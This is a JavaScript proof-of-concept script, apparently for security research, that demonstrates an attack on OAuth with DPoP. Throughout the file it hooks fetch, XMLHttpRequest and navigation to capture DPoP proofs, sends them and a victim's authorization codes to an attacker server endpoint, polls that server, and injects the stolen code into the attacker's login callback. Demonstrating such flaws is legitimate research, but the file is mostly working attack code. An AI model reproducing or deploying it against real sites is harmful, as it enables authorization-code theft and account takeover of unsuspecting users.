/**
 * OAuth DPoP Attack Demonstration Script
 * 
 * This script demonstrates a theoretical attack on OAuth with DPoP where:
 * 1. Attacker intercepts their own DPoP proof during OAuth flow
 * 2. Victim's browser is tricked into using the stolen DPoP proof
 * 3. Victim's auth code is stolen and sent back to attacker
 * 4. Attacker uses stolen auth code to complete their OAuth flow
 */

const ATTACKER_API = 'https://localhost:7666';
const SESSION_ID_KEY = 'attack_session_id';
const POLL_INTERVAL = 2000; // 2 seconds

class OAuthAttack {
    constructor() {
        this.sessionId = this.getOrCreateSessionId();
        this.mode = null; // 'attacker' or 'victim'
        this.originalFetch = window.fetch;
        this.originalOpen = XMLHttpRequest.prototype.open;
        this.originalSend = XMLHttpRequest.prototype.send;
        this.dpopProof = null;
        this.pollingInterval = null;
        this.logElement = document.getElementById('status');
        this.updateUI();
    }

    getOrCreateSessionId() {
        let sessionId = sessionStorage.getItem(SESSION_ID_KEY);
        if (!sessionId) {
            sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
            sessionStorage.setItem(SESSION_ID_KEY, sessionId);
        }
        
        // Update session ID display if element exists
        const sessionIdElement = document.getElementById('session-id');
        if (sessionIdElement) {
            sessionIdElement.textContent = sessionId;
        }
        
        return sessionId;
    }
    
    log(message, isError = false) {
        const timestamp = new Date().toISOString().substr(11, 12);
        const logLine = `[${timestamp}] ${message}`;
        console.log(`[${this.mode?.toUpperCase() || 'UNKNOWN'}]`, message);
        
        if (this.logElement) {
            const logEntry = document.createElement('div');
            logEntry.textContent = logLine;
            if (isError) {
                logEntry.style.color = '#dc3545';
            }
            this.logElement.prepend(logEntry);
            
            // Keep log at a reasonable size
            if (this.logElement.children.length > 50) {
                this.logElement.removeChild(this.logElement.lastChild);
            }
        }
    }
    
    updateUI() {
        const statusElement = document.getElementById('victim-status');
        if (statusElement) {
            if (this.mode === 'attacker') {
                statusElement.textContent = 'Attacker Mode';
                statusElement.className = 'badge bg-danger';
            } else if (this.mode === 'victim') {
                statusElement.textContent = 'Victim Mode';
                statusElement.className = 'badge bg-primary';
            } else {
                statusElement.textContent = 'Inactive';
                statusElement.className = 'badge bg-secondary';
            }
        }
    }

    /**
     * Initialize as ATTACKER mode
     * Intercepts DPoP proof before it reaches the authorize endpoint
     */
    async initAttacker() {
        this.mode = 'attacker';
        this.updateUI();
        this.log('Initializing attacker mode...');
        this.log(`Session ID: ${this.sessionId}`);
        
        // Enable start OAuth flow button
        const startBtn = document.getElementById('start-btn');
        if (startBtn) startBtn.disabled = false;
        
        // We don't need to intercept requests or navigation anymore
        // The attacker manually copies parameters and redirects to callback
        // this.interceptRequests();
        // this.interceptNavigation();
        this.startCodePolling();
        
        this.log('Attacker mode initialized. Click "Start OAuth Flow" to begin.');
    }

    /**
     * Initialize as VICTIM mode
     * Polls for stolen DPoP proof and performs silent authentication
     */
    async initVictim() {
        this.mode = 'victim';
        this.updateUI();
        this.log('Initializing victim mode...');
        this.log(`Session ID: ${this.sessionId}`);
        
        // Enable manual auth button
        const authBtn = document.getElementById('auth-btn');
        if (authBtn) authBtn.disabled = false;
        
        this.startDPoPPolling();
        this.log('Victim mode initialized. Polling for DPoP proof...');
    }

    /**
     * Intercept all HTTP requests to capture DPoP proofs
     */
    interceptRequests() {
        const self = this;

        // Intercept fetch API
        window.fetch = async function(...args) {
            const url = args[0];
            const options = args[1] || {};
            const request = new Request(url, options);
            
            try {
                // Check if this is a request to the token endpoint with DPoP
                if (self.mode === 'attacker' && 
                    options?.headers?.get?.('DPoP') && 
                    url.toString().includes('/connect/token')) {
                    
                    const dpopProof = options.headers.get('DPoP');
                    self.log(`Intercepted DPoP proof for token endpoint`);
                    
                    await self.exfiltrateDPoPProof({
                        sessionId: self.sessionId,
                        dpopProof: dpopProof,
                        dpopHeader: dpopProof,
                        url: url.toString(),
                        method: options.method || 'POST',
                        nonce: '' // Will be filled in by the server
                    });
                }
            } catch (error) {
                console.error('Error in fetch interceptor:', error);
            }

            return self.originalFetch.apply(this, args);
        };

        // Intercept XMLHttpRequest for older code
        const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
        XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
            if (header.toLowerCase() === 'dpop' && self.mode === 'attacker') {
                self.log(`Intercepted DPoP header in XHR: ${value.substring(0, 30)}...`);
                
                // Store for later exfiltration
                this._dpopHeader = value;
                this._dpopUrl = this._url;
                this._dpopMethod = this._method;
            }
            return originalSetRequestHeader.call(this, header, value);
        };

        const originalXhrOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, ...rest) {
            this._method = method;
            this._url = url;
            return originalXhrOpen.call(this, method, url, ...rest);
        };
        
        const originalXhrSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            if (this._dpopHeader && self.mode === 'attacker') {
                const selfXhr = this;
                const originalOnReadyStateChange = this.onreadystatechange;
                
                this.onreadystatechange = function() {
                    if (this.readyState === XMLHttpRequest.HEADERS_RECEIVED) {
                        const nonce = this.getResponseHeader('DPoP-Nonce');
                        if (nonce) {
                            self.log(`Intercepted DPoP nonce: ${nonce}`);
                            
                            self.exfiltrateDPoPProof({
                                sessionId: self.sessionId,
                                dpopProof: selfXhr._dpopHeader,
                                dpopHeader: selfXhr._dpopHeader,
                                url: selfXhr._url,
                                method: selfXhr._method || 'POST',
                                nonce: nonce
                            });
                        }
                    }
                    
                    if (originalOnReadyStateChange) {
                        return originalOnReadyStateChange.apply(this, arguments);
                    }
                };
            }
            
            return originalXhrSend.call(this, body);
        };
    }

    /**
     * Intercept navigation to capture DPoP proof from authorize URL
     */
    interceptNavigation() {
        const self = this;
        
        // Check if we're already on an authorize page with DPoP proof
        this.checkCurrentUrlForDPoP();
        
        // Intercept window.location assignments
        const originalLocationSetter = Object.getOwnPropertyDescriptor(window, 'location').set;
        Object.defineProperty(window, 'location', {
            set: function(value) {
                if (self.mode === 'attacker' && typeof value === 'string' && value.includes('/connect/authorize')) {
                    self.log('Intercepting authorize redirect...');
                    
                    // Extract DPoP JKT from URL if present
                    const url = new URL(value, window.location.origin);
                    const dpopJkt = url.searchParams.get('dpop_jkt');
                    
                    if (dpopJkt) {
                        self.log(`Found DPoP JKT in authorize URL: ${dpopJkt}`);
                        
                        // Exfiltrate the DPoP JKT
                        self.exfiltrateDPoPProof({
                            sessionId: self.sessionId,
                            dpopProof: dpopJkt,
                            dpopHeader: dpopJkt,
                            url: url.origin + url.pathname,
                            method: 'GET',
                            nonce: ''
                        });
                    }
                }
                
                // Continue with the original navigation
                return originalLocationSetter.call(this, value);
            },
            get: function() {
                return window.location;
            }
        });
        
        self.log('Navigation interception enabled');
    }

    /**
     * Check the current URL for DPoP JKT (for server-side redirects)
     */
    checkCurrentUrlForDPoP() {
        if (this.mode !== 'attacker') return;
        
        const currentUrl = window.location.href;
        
        // Check if we're on the authorize endpoint
        if (currentUrl.includes('/connect/authorize')) {
            this.log('Detected authorize endpoint in current URL');
            
            const urlParams = new URLSearchParams(window.location.search);
            const dpopJkt = urlParams.get('dpop_jkt');
            
            if (dpopJkt) {
                this.log(`Found DPoP JKT (thumbprint) in current URL: ${dpopJkt}`);
                
                // Exfiltrate the DPoP JKT
                this.exfiltrateDPoPProof({
                    sessionId: this.sessionId,
                    dpopProof: dpopJkt,
                    dpopHeader: dpopJkt,
                    url: window.location.origin + window.location.pathname,
                    method: 'GET',
                    nonce: ''
                });
            }
        }
    }

    /**
     * Intercept OAuth callback to capture authorization code
     */
    interceptAuthCallback() {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const issuer = urlParams.get('iss');

        if (code && this.mode === 'victim') {
            this.log(`Intercepted authorization code: ${code}`);
            
            // Send the code to the attacker API
            this.exfiltrateAuthCode({
                sessionId: this.sessionId,
                code: code,
                state: state,
                issuerUrl: issuer || window.location.origin
            });

            // Stop the normal OAuth flow
            urlParams.delete('code');
            urlParams.delete('state');
            urlParams.delete('iss');

            const newUrl = window.location.pathname + (urlParams.toString() ? '?' + urlParams.toString() : '');
            window.history.replaceState({}, '', newUrl);

            return true;
        } else if (this.mode === 'attacker' && code) {
            this.log('Received authorization code in attacker window');
            return false;
        }
        return false;
    }

    /**
     * Send stolen DPoP proof to attacker's server
     */
    async exfiltrateDPoPProof(data) {
        try {
            const response = await this.originalFetch.call(window, `${ATTACKER_API}/api/attack/dpop`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: this.sessionId,
                    dpopProof: data.dpopProof,
                    dpopHeader: data.dpopHeader,
                    nonce: data.nonce || '',
                    url: data.url,
                    method: data.method
                })
            });

            if (response.ok) {
                console.log('[ATTACKER] Successfully exfiltrated DPoP proof to server');
            }
        } catch (error) {
            console.error('[ATTACKER] Failed to exfiltrate DPoP proof:', error);
        }
    }

    /**
     * Send stolen auth code to attacker's server
     */
    async exfiltrateAuthCode(data) {
        try {
            // Use the attacker's session ID if available (victim mode)
            const attackerSessionId = sessionStorage.getItem('attacker_session_id');
            const targetSessionId = attackerSessionId || this.sessionId;
            
            const response = await this.originalFetch.call(window, `${ATTACKER_API}/api/attack/code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: targetSessionId,
                    code: data.code,
                    state: data.state || '',
                    issuerUrl: data.issuerUrl || ''
                })
            });

            if (response.ok) {
                this.log(`Successfully exfiltrated auth code to attacker server (session: ${targetSessionId})`);
            }
        } catch (error) {
            console.error('[VICTIM] Failed to exfiltrate auth code:', error);
        }
    }

    /**
     * Poll attacker API for stolen DPoP proof (victim mode)
     */
    async startDPoPPolling() {
        const self = this;

        const poll = async () => {
            try {
                const response = await this.originalFetch.call(window,
                    `${ATTACKER_API}/api/attack/dpop/${this.sessionId}`);

                if (response.ok) {
                    const dpopData = await response.json();
                    console.log('[VICTIM] Received stolen DPoP proof:', dpopData);

                    // Stop polling
                    clearInterval(pollInterval);

                    // Trigger silent authentication with stolen proof
                    await self.performSilentAuth(dpopData);
                }
            } catch (error) {
                // Keep polling on error
            }
        };

        const pollInterval = setInterval(poll, 2000); // Poll every 2 seconds
        poll(); // Start immediately
    }

    /**
     * Perform silent authentication using stolen DPoP proof
     */
    async performSilentAuth(dpopData) {
        console.log('[VICTIM] Starting silent authentication with stolen DPoP proof...');

        // Create hidden iframe for silent auth
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.id = 'silent-auth-iframe';

        // Intercept messages from iframe
        window.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'auth_callback') {
                console.log('[VICTIM] Received auth callback from iframe');
                this.interceptAuthCallback();
            }
        });

        // Build authorization URL with stolen DPoP proof
        // This would need to be injected at the right point in the OAuth flow
        const authUrl = '/signin-oidc'; // Or wherever the auth starts

        iframe.src = authUrl;
        document.body.appendChild(iframe);
    }

    /**
     * Poll attacker API for stolen auth code (attacker mode)
     */
    async startCodePolling() {
        const self = this;

        const poll = async () => {
            try {
                const response = await this.originalFetch.call(window,
                    `${ATTACKER_API}/api/attack/code/${this.sessionId}`);

                if (response.ok) {
                    const codeData = await response.json();
                    console.log('[ATTACKER] Received stolen authorization code:', codeData);

                    // Store for injection
                    sessionStorage.setItem('stolen_auth_code', codeData.code);
                    sessionStorage.setItem('stolen_state', codeData.state);

                    // Don't alert - the UI will show the status
                    this.log('Authorization code received! Click "Complete Login with Stolen Code" button.');
                }
            } catch (error) {
                // Keep polling
            }
        };

        setInterval(poll, 2000); // Poll every 2 seconds
    }

    /**
     * Inject stolen auth code into current OAuth flow
     */
    injectStolenCode() {
        const code = sessionStorage.getItem('stolen_auth_code');
        const state = sessionStorage.getItem('stolen_state');

        if (code) {
            console.log('[ATTACKER] Injecting stolen authorization code');

            // Redirect to callback URL with stolen code
            const callbackUrl = `/signin-oidc?code=${encodeURIComponent(code)}&state=${encodeURIComponent(state)}`;
            window.location.href = callbackUrl;
        } else {
            console.log('[ATTACKER] No stolen code available yet');
        }
    }
}

// Export for use
window.OAuthAttack = OAuthAttack;

// Auto-initialize based on URL parameter
const urlParams = new URLSearchParams(window.location.search);
const attackMode = urlParams.get('attack_mode');

if (attackMode === 'attacker') {
    const attack = new OAuthAttack();
    attack.initAttacker();
    window.attackInstance = attack;
} else if (attackMode === 'victim') {
    const attack = new OAuthAttack();
    attack.initVictim();
    window.attackInstance = attack;
}

